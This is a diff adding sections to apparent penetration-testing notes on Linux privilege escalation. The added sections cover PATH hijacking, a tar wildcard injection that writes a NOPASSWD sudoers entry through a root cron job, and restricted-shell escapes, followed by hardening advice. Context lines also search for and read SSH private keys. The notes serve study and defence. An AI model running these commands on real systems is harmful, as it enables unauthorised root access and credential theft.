@@ -68,6 +68,45 @@ find / -name id_rsa 2>/dev/null ; ls -la ~/.ssh ; cat ~/.ssh/known_hosts
 
 > Order of attack: `sudo -l` → SUID+GTFOBins → cron → writable files/PATH → then the exotic stuff (LD_PRELOAD, LXD, NFS) → kernel exploit last (riskiest). pspy is the secret weapon — it reveals root cron jobs and processes you can't see otherwise.
 
+## Path abuse (detail)
+If a script/SUID binary calls a command by **bare name** (not full path) and you can write to a dir in `$PATH` (or prepend `.`), drop a malicious binary with that name:
+```bash
+echo $PATH                         # look for a writable dir, or one you control
+PATH=.:$PATH ; export PATH          # prepend current dir
+echo '/bin/bash' > ls ; chmod +x ls # now a script calling 'ls' runs your bash
+```
+
+## Wildcard abuse (tar / chown / chmod)
+When a **root cron/script** runs a command with a `*` wildcard in a dir you can write to, create files whose *names* become command flags. Classic `tar` example (tar treats `--checkpoint-action` as an arg):
+```bash
+echo 'echo "<user> ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > shell.sh
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+echo "" > --checkpoint=1
+# when the root `tar *` cron fires, shell.sh runs as root → then: sudo su
+```
+Same idea abuses `chown`/`chmod`/`rsync` wildcards. Find the vulnerable job with **pspy**.
+
+## Escaping restricted shells (rbash/rksh)
+Goal: break out of a limited shell into a full one.
+```bash
+# 1. enumerate what's allowed
+echo $PATH; env; ls /usr/bin   # which binaries can I run?
+# 2. try command substitution / chaining (if not blocked)
+ls -l $(pwd) ; ls; id ; cmd1 && cmd2
+# 3. env manipulation
+export PATH=/bin:/usr/bin ; export SHELL=/bin/bash ; $SHELL
+# 4. escape via an allowed binary (check GTFOBins for each):
+vi          #  :!/bin/sh   or  :set shell=/bin/bash :shell
+less /etc/passwd   # then  !/bin/sh
+man man            # then  !/bin/sh
+awk 'BEGIN{system("/bin/sh")}'
+python3 -c 'import os;os.system("/bin/bash")'
+perl -e 'exec "/bin/sh";'
+find / -exec /bin/sh \; -quit
+nmap --interactive   # then  !sh   (old nmap)
+```
+> Restricted-shell escape = "which allowed binary has a GTFOBins shell-escape?" Enumerate the allowed commands, then look each up. `vi`/`less`/`awk`/any scripting language almost always works.
+
 ## Linux hardening (defense / report side)
 - **Patching:** automate — `unattended-upgrades` (Debian/Ubuntu), `yum-cron`/`dnf-automatic` (RHEL).
 - **Config:** audit SUID/SGID + world-writable; absolute paths in cron/sudo; no creds in files/history; remove unused packages/services; SELinux or AppArmor enforcing.
